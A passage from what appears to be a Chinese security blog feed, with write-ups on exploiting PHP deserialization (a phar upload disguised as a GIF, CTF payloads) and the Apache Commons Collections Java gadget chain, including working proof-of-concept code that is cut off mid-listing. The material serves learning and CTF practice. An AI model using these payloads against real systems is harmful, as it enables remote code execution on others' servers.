<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/gif"</span>)&amp;&amp;(substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>)+<span class="number">1</span>))== <span class="string">'gif'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">      <span class="string">"upload_file/"</span> .$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file,you can only upload gif"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>upload_file.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Upload&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<p>file_un.php存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure>

<p><strong>根据file_un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码</strong><br>构造eval.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">'phpinfo();'</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<p>访问eval.php生成phar.phar，将后缀改为gif。<br><img src="https://upload-images.jianshu.io/upload_images/9113969-76b33b8e7dc5c1a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后上传到目录下与<code>file_un.php</code>同目录，利用<code>file_un.php</code>中的危险函数getshell<br>payload:<code>file_un.php?filename=phar://phar.gif/test</code><br><img src="https://upload-images.jianshu.io/upload_images/9113969-dd5905733c0bf54d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h4 id="靶场相关题目"><a href="#靶场相关题目" class="headerlink" title="靶场相关题目"></a>靶场相关题目</h4><h5 id="攻防世界（unserialize3"><a href="#攻防世界（unserialize3" class="headerlink" title="攻防世界（unserialize3)"></a>攻防世界（unserialize3)</h5><p>题目来源:攻防世界 web进阶区</p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114184702.png">

<p>代码审计可知我们需要绕过__wakeup()函数。</p>
<p> 我们首先根据题目源码构造序列化代码。</p>
<p><img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200114190910.png" alt></p>
<p>这里利用到了一个 __wakeup()函数的漏洞（CVE-2016-7124）。</p>
<p><strong>一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，可以用来绕过；</strong></p>
<p>得到的序列化字符串为：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
<p>括号前的数字即为属性值,所以将其修改后传入url中即可获得flag。</p>
<p><img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200114191751.png" alt></p>
<h5 id="Bugku-CTF-php伪协议-amp-反序列化"><a href="#Bugku-CTF-php伪协议-amp-反序列化" class="headerlink" title="Bugku CTF (php伪协议&amp;反序列化)"></a>Bugku CTF (php伪协议&amp;反序列化)</h5><p>首先我们根据源码提示，利用php伪协议得到反序列化相关代码。</p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114195646.png" style="zoom:67%;">

<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114195734.png" style="zoom:67%;">

<p>这里看到了<strong>__string</strong>魔术方法：作用为将flag类作为字符串执行时会自动执行此函数。</p>
<p>在index.php又发现了关键函数unserialize();正则匹配函数preg_match对flag进行了匹配。</p>
<p>由于过滤不能通过文件包含的方式读取flag。但是我们可以自由的传入password的值。</p>
<p>所以我们就可以构造序列化对象：变量file=flag.php，传给password</p>
<p><img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200114201936.png" alt></p>
<p>构造payload:</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">?txt=php://<span class="meta">input</span><span class="variable">&amp;file</span>=hint.php<span class="variable">&amp;passwordO</span>:4:<span class="string">"Flag"</span>:1:&#123;s:4:<span class="string">"file"</span>;s:8:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>即可得到flag.</p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://blog.szfszf.top/article/24/" target="_blank" rel="noopener">https://blog.szfszf.top/article/24/</a></p>
<p><a href="https://www.smi1e.top/php反序列化攻击拓展/" target="_blank" rel="noopener">https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/</a></p>
<p><a href="https://www.freebuf.com/column/154530.html" target="_blank" rel="noopener">https://www.freebuf.com/column/154530.html</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>从apache-commons-collections中学习java反序列化</title>
    <url>/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/</url>
    <content><![CDATA[<p>本文首发于先知社区:<a href="https://xz.aliyun.com/t/8500" target="_blank" rel="noopener">从apache-commons-collections中学习java反序列化 - 先知社区 (aliyun.com)</a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    java安全学习的第一篇文章，<strong>apache commons collections3.1</strong>的反序列化漏洞是java历史上最出名同时也是最具有代表性的反序列化漏洞，废话不多说，我们直接上手分析。希望能帮助到和我一样的初学者。</p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul>
<li>jdk 1.7版本</li>
<li>IntelliJ IDEA<ul>
<li>File -&gt; Project Structure -&gt;Modules-&gt; Dependencies -&gt;JARs or directories</li>
</ul>
</li>
<li>commons-collections-3.1 jar<ul>
<li>可以直接使用idea自带的maven下载依赖包:</li>
<li><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></li>
</ul>
</li>
</ul>
<h3 id="基础知识准备"><a href="#基础知识准备" class="headerlink" title="基础知识准备"></a>基础知识准备</h3><h4 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h4><p>​    反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</p>
<p>​    Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">Java.lang.Class;</span><br><span class="line">Java.lang.reflect<span class="function">.<span class="keyword">Constructor</span>;</span></span><br><span class="line">Java.lang.reflect.Field;</span><br><span class="line">Java.lang.reflect<span class="function">.<span class="keyword">Method</span>;</span></span><br><span class="line">Java.lang.reflect.Modifier;</span><br></pre></td></tr></table></figure>

<h5 id="获取反射中的Class对象"><a href="#获取反射中的Class对象" class="headerlink" title="获取反射中的Class对象"></a>获取反射中的Class对象</h5><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">#<span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>forName 静态方法</span><br><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.String"</span>)</span>;</span><br><span class="line">#使用 .<span class="keyword">class</span> 方法。</span><br><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">String</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">#使用类对象的 get<span class="constructor">Class()</span> 方法</span><br><span class="line">String str = <span class="keyword">new</span> <span class="constructor">String(<span class="string">"Hello"</span>)</span>;</span><br><span class="line">Class clz = str.get<span class="constructor">Class()</span>;</span><br></pre></td></tr></table></figure>

<h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应<span class="keyword">Class</span>的对象</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">Method</span> <span class="title">getMethod</span><span class="params">(String name, <span class="keyword">Class</span>&lt;?&gt;... parameterTypes)</span></span></span><br></pre></td></tr></table></figure>

<h5 id="反射Runtime执行本地命令"><a href="#反射Runtime执行本地命令" class="headerlink" title="反射Runtime执行本地命令"></a>反射Runtime执行本地命令</h5><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.Runtime"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.get<span class="constructor">DeclaredConstructor()</span>;</span><br><span class="line">constructor.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.get<span class="constructor">Method(<span class="string">"exec"</span>, String.<span class="params">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">IOUtils</span>.</span></span><span class="keyword">to</span><span class="constructor">String(<span class="params">in</span>, <span class="string">"UTF-8"</span>)</span>);</span><br></pre></td></tr></table></figure>

<h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p>​    类似php中反序列化使用的魔术方法，比如__destruct函数。在java中，<strong>readObject</strong>方法在反序列化漏洞时起到了至关重要的作用，利用ObjectInputStream的readObject方法进行对象读取的时候，<strong>当readObject()方法被重写的时候，反序列化该类时调用的就是重写的方法。</strong></p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> writeObject(ObjectOutputStream oos)  <span class="comment">//自定义序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(ObjectInputStream ois)  <span class="comment">//自定义反序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObjectNoData()</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">Object</span> writeReplace()  <span class="comment">//写入时替换对象。</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">Object</span> readResolve()</span><br></pre></td></tr></table></figure>

<p>反序列化时会自动调用readObject(ObjectInputStream)方法。我们通过在需要序列化/反序列化的类中定义<code>readObject</code>和<code>writeObject</code>方法从而实现自定义的序列化和反序列化操作。</p>
<h3 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h3><p>我们在分析cc链反序列化化漏洞的主要思路其实就是两条:</p>
<ul>
<li>利用<code>InvokerTransformer</code> 、 <code>ConstantTransformer</code> 、 <code>ChainedTransformer</code> 等类构建反射链，利用java的反射机制，然后通过类中的transformer类来调用。</li>
<li>找Common Collections中的类在反序列化时，会触发调用 <code>transform</code> 方法的情况，并以此来构建反序列化漏洞的攻击链。</li>
</ul>
<p>接下来我们使用IDEA跟进代码进行审计</p>
<h4 id="一、寻找反射链"><a href="#一、寻找反射链" class="headerlink" title="一、寻找反射链"></a>一、寻找反射链</h4><h5 id="org-apache-commons-collections-functors-InvokerTransformer"><a href="#org-apache-commons-collections-functors-InvokerTransformer" class="headerlink" title="org/apache/commons/collections/functors/InvokerTransformer"></a>org/apache/commons/collections/functors/InvokerTransformer</h5><p><strong>IDEA跟进类中(48~61行):</strong></p>
<p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201107192725.png" alt></p>
<p>​    可以看到此处的transform方法调用了java的反射机制,并且发现<code>this.iMethodName</code> , <code>this.iParamTypes</code>, <code>this.iArgs</code>我们都是可以直接输入的。而<code>input</code>是在函数调用的时候传入的，我们同样是可控的。</p>
<p>当我们向对应参数传入以下值，即可以调用代码执行:</p>
<p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201107194652.png" alt></p>
<p>​    <strong>存在一组可控的反射调用</strong>是cc链存在反序列化漏洞的根本原因，但是这里我们只能只能在本地服务器上执行。是无法达成我们想要远程执行命令的效果，这里主要的限制是我们没有没有办法直接传入Runtime类的实例对象。</p>
<p>要想真正的形成调用链，我们仍然需要利用java的反射机制来调用函数，并且至少要调用四个方法:</p>
<figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">getMethod</span><span class="params">()</span>, <span class="title">getRuntime</span><span class="params">()</span>, <span class="title">exec</span><span class="params">()</span> ,<span class="title">invoke</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>所以我们之后找到了<code>ChainedTransformer</code> 类。</p>
<h5 id="org-apache-commons-collections-functors-ChainedTransformer"><a href="#org-apache-commons-collections-functors-ChainedTransformer" class="headerlink" title="org/apache/commons/collections/functors/ChainedTransformer"></a>org/apache/commons/collections/functors/ChainedTransformer</h5><p><strong>IDEA跟进53~63行</strong></p>
<p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201107200130.png" alt></p>
<p>简单的分析代码逻辑，该类的构造函数接受一个数组，我们只需要传入一个数组<code>chainedTransformer</code>就可以依次去调用每一个类的transform方法。</p>
<h4 id="org-apache-commons-collections-functors-ConstantTransformer"><a href="#org-apache-commons-collections-functors-ConstantTransformer" class="headerlink" title="org/apache/commons/collections/functors/ConstantTransformer"></a>org/apache/commons/collections/functors/ConstantTransformer</h4><p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201107212925.png" alt></p>
<p>接口函数，在上面的循环中进入了不同的函数。给一个初始的object，然后输出作为下一个输入，从而实现链式调用。</p>
<p><strong>最后的反射poc如下:</strong></p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="type">Transformer</span>[] &#123;</span><br><span class="line">            <span class="comment">//传入Runtime类</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"getMethod"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;<span class="keyword">String</span>.class, Class[].<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> <span class="type">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"invoke"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;Object.class, Object[].<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="type">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用exec方法</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"exec"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;<span class="keyword">String</span>.<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="string">"open -a Calculator"</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> <span class="type">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>我们已经构造好了恶意的反射链条，现在我们的目标是触发该类的transform方法。</p>
<h4 id="二、寻找触发链"><a href="#二、寻找触发链" class="headerlink" title="二、寻找触发链"></a>二、寻找触发链</h4><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">某个类的readObject方法</span><br><span class="line">-&gt;一系列调用</span><br><span class="line">-&gt;Transformerchain的transformer方法</span><br><span class="line">-&gt;执行反射链</span><br><span class="line">-&gt;执行Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"calc"</span>&#125;)</span><br></pre></td></tr></table></figure>

<ul>
<li>找到一个 <code>tansform()</code> 方法 , 该方法所属的实例对象是可控的</li>
<li>找到一个重写的 <code>readObject()</code> 方法 , 该方法会自动调用 <code>transform()</code> 方法.</li>
</ul>
<h4 id="JDK1-7–TransformedMap利用链"><a href="#JDK1-7–TransformedMap利用链" class="headerlink" title="JDK1.7–TransformedMap利用链"></a>JDK1.7–TransformedMap利用链</h4><p>​    <strong>Transmap类</strong>在一个元素被添加/删除/或是被修改时，会调用transform方法。我们可以通过TransformedMap.decorate()方法获得一个TransformedMap的实例。</p>
<p>​     因此，我们可以先构造一个TransformeMap实例,然后修改其中的数据，然后使其自动调用我们之前设定好的transform()方法。</p>
<h5 id="调用链"><a href="#调用链" class="headerlink" title="调用链:"></a>调用链:</h5><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">-&gt;ObjectInputStream.readObject()</span><br><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">-&gt;TransformedMap.entrySet().iterator().next().setValue()</span><br><span class="line">-&gt;TransformedMap.checkSetValue()</span><br><span class="line"><span class="function"> -&gt;</span>TransformedMap.transform()</span><br><span class="line">-&gt;ChainedTransformer.transform()</span><br></pre></td></tr></table></figure>

<h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p>首先看<code>/org/apache/commons/collections/map/TransformedMap</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map <span class="built_in">map</span>, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        super(<span class="built_in">map</span>);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p> <code>TransformedMap</code>中的<code>valueTransformer</code>在初始化时我们是可控的.</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> put(<span class="keyword">Object</span> <span class="built_in">key</span>, <span class="keyword">Object</span> value) &#123;</span><br><span class="line">        <span class="built_in">key</span> = <span class="keyword">this</span>.transformKey(<span class="built_in">key</span>);</span><br><span class="line">        value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(<span class="built_in">key</span>, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当执行put方法时会进入<code>transformValue</code>方法:</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object transformValue(Object <span class="keyword">object</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="literal">null</span> ? <span class="keyword">object</span> : <span class="keyword">this</span>.valueTransformer.transform(<span class="keyword">object</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以控制这里的<code>valueTransformer</code>值为ChianedTransformer即可触发利用链。</p>
<p><strong>但是目前的构造仍然需要Map中的某一项去调用setValue(),我们如果想要在反序列化调用readObject()时直接触发呢?</strong></p>
<h5 id="AbstractInputCheckedMapDecorator类"><a href="#AbstractInputCheckedMapDecorator类" class="headerlink" title="AbstractInputCheckedMapDecorator类"></a>AbstractInputCheckedMapDecorator类</h5><p>​    调用java自带类<code>AnnotationInvocationHandler</code>中重写的readObject方法，该方法调用时会先将map转为Map.entry,然后执行setvalue操作。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">var5</span><span class="selector-class">.setValue</span>((<span class="selector-tag">new</span> <span class="selector-tag">AnnotationTypeMismatchExceptionProxy</span>(<span class="selector-tag">var8</span><span class="selector-class">.getClass</span>() + "<span class="selector-attr">[<span class="string">" + var8 + "</span>]</span>"))<span class="selector-class">.setMember</span>((<span class="selector-tag">Method</span>)<span class="selector-tag">var2</span><span class="selector-class">.members</span>()<span class="selector-class">.get</span>(<span class="selector-tag">var6</span>)));</span><br></pre></td></tr></table></figure>

<p>TransformedMap利用Map.Entry取得第一个值，调用修改值的函数，会触发的setValue()代码</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span>(<span class="params">Object <span class="keyword">value</span></span>)</span> &#123;</span><br><span class="line">            <span class="keyword">value</span> = <span class="keyword">this</span>.parent.checkSetValue(<span class="keyword">value</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.entry.setValue(<span class="keyword">value</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>接着到了TransoformedMap的checkSetValue()方法。</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span>(<span class="params">Object <span class="keyword">value</span></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(<span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这里的valueTransformer.transform实际上就是ChianedTransformer类的transform方法。就会触发刚刚我们构造的反射链。</p>
<h5 id="最后的POC："><a href="#最后的POC：" class="headerlink" title="最后的POC："></a>最后的POC：</h5><p>这里直接上其他大师傅们的poc:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package Serialize2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> ApacheSerialize2 implements <span class="keyword">Serializable</span> &#123;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) throws <span class="keyword">Exception</span>&#123;</span><br><span class="line">         Transformer[] transformers = <span class="built_in">new</span> Transformer[]&#123;</span><br><span class="line">                 <span class="built_in">new</span> ConstantTransformer(Runtime.<span class="keyword">class</span>),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("getMethod", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>, <span class="keyword">Class</span>[].<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"getRuntime", <span class="built_in">new</span> <span class="keyword">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("invoke", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;<span class="keyword">Object</span>.<span class="keyword">class</span>, <span class="keyword">Object</span>[].<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;<span class="keyword">null</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("exec", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"calc.exe"&#125;)</span><br><span class="line">         &#125;;</span><br><span class="line">         Transformer transformerChain = <span class="built_in">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">         Map map = <span class="built_in">new</span> HashMap();</span><br><span class="line">         map.put("value", "sijidou");</span><br><span class="line">         Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">         <span 